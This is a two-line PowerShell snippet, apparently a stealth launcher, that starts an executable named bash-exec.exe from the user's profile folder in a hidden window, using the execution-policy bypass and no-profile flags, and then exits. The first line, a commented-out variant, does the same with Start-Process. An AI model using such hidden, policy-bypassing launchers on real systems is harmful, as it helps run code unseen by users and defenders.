#Start-Process -WindowStyle hidden -FilePath $env:userprofile\bash-exec.exe
PowerShell.exe -windowstyle hidden -ex Bypass -nop $env:userprofile\bash-exec.exe && exit